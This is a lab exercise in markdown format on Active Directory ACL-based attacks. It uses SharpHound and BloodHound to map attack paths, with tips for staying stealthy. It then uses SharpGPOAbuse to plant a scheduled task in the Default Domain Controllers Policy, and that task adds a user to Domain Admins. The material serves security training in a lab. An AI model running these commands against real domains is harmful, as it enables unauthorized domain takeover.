# Exercise 5 - ACL-based attacks

## Tools

You can find all tools needed in the ["attacker-tools.zip"-file](../exercises/attacker-tools). The links below are for your own reference.

Tools needed:

- PowerView: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
- Bloodhound: [https://github.com/BloodHoundAD](https://github.com/BloodHoundAD)

## Exercise

This exercise is split in two parts. Part one covers the use of Bloodhound to collect and analyze data from Active Directory. Part two demonstrates an ACL-based attack on Group Policies.

### Part 1 - Bloodhound Exercise

First load "Sharphound", which is the data collection tool for Bloodhoud.

```
cd C:\attacker-tools
cat -raw .\SharpHound.ps1 | iex
```

Run sharphound to gather data on the domain.

```
Invoke-Bloodhound -CollectionMethod DcOnly -Stealth -PrettyJson -NoSaveCache
```

 - **-CollectionMethod DcOnly** means only collect data from the domain controller. This is preferable from an opsec-perspective since we blend in with existing traffic.
 - **-Stealth** means run single-threaded. Slower but also less noisy.
 - **-PrettyJson** means format the .json-files in a way that you can read them.
 - **-NoSaveCache** means do not save a cache file. Therefore everytime you run Sharphound it will start fresh from the beginning. Useful for demo purposes.

You shoud now see a ZIP file in your working directory called "TIMESTAMP_Bloodhound.zip". This ZIP contains the information gathered by Sharphound and can be ingested into Bloodhound. To get Bloodhound started we have to

1. Unzip "attacker-tools\BloodHound-win32-x64.zip".
2. After that, run "attacker-tools\BloodHound-win32-x64\BloodHound-win32-x64\BloodHound.exe". Log in with the user "neo4j" and the password you choose during Lab setup.
3. Ingest the ZIP file into bloodhound by just drag-and-drop it into the empty space in the center of the UI.

Thats it. Now you can start your analysis by experimenting with the "Pre-Built Analytics Queries" in the "Analysis" tab.

#### Questions

- Mark the user "taskservice" as owned. Find an attack path that will allows us to take control of the domain controller using the user taskservice.
- We got control over taskservice through kerberoasting but Bloodhound also shows you a different attack path. Which other user can manipulate the user taskservice? `Hint:` we got control over that user in the NTLM exercise
- **Bonus Question:** find a way to exploit the attack path you just found and try to execute it in the lab environment.

### Part 2 - GPO Exercise

The previous exercise revealed that the user "taskservice" has write permissions on "Default Domain Controllers" group policy. We'll use this to get us domain admin rights.

First, start powershell as user "taskservice". Since we know the password by now, we can just use run-as. Then go on with the steps below in this new powershell window.

```
cd C:\attacker-tools
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author contoso\adminuser --Command "cmd.exe" --Arguments '/c net group \"Domain Admins\" john /ADD' --GPOName "Default Domain Controllers Policy" --force
```

In a real environment, we would have to wait until the gpo is reprocessed by the DC. To speed this up, run gpupdate on the DC.

```
gpupdate /force
```

Verify that it worked by checking johns group memberships (using powerview again).

```
Get-DomainUser john | select memberof
```

**Woohoo - you finally made it to Domain Admin. Now grab yourself a beverage of your choice :-)**
